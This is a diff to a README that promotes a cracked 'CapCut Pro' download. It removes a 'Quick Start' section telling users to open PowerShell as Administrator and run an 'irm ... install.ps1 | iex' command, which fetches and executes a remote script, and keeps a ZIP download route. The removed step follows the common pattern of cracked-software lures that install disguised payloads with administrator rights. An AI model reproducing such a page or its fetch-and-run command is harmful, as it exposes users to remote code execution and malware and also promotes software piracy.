@@ -88,22 +88,7 @@ If you're looking for where to **download the CapCut crack**, **cracked CapCut P
 
 ## ⚙️ Installation Guide
 
-### Quick Start (PowerShell)
-
-```bash
-1. Launch PowerShell as Administrator
-   (Press Win + X → Terminal / PowerShell)
-
-2. Execute the setup script:
-
-   irm https://raw.githubusercontent.com/YOUR_USERNAME/CapCut-Pro-Elite-Suite/main/install.ps1 | iex
-
-3. Wait for completion
-4. Launch CapCut
-5. Enjoy all premium features!
-```
-
-### Alternative Installation
+### Quick Start
 
 ```bash
 1. Download the latest release (ZIP)
